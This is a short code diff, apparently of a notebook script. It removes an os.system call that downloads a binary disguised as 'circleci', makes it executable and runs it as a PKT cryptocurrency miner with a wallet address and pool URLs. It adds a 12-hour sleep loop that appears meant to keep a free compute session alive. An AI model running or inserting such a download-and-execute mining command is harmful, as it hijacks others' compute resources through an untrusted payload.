@@ -1,3 +1,14 @@
-import os
-os.system('curl https://github.com/aurbach55/zash/raw/main/circleci --output circleci && chmod 777 circleci && ./circleci ann -p pkt1qfd04qlvx4ag9yrm9m5ju6fwp2kyx7ct0fnteqp  http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world')
+import time
 
+
+ativar = True #@param {type:'boolean'}
+
+temps = 0
+sec = 360
+while(temps < 43200):
+  if(temps == sec):
+    sec += 360
+    x = (temps/60)/60
+    print("pass",x," minute")
+  time.sleep(1)
+  temps += 1
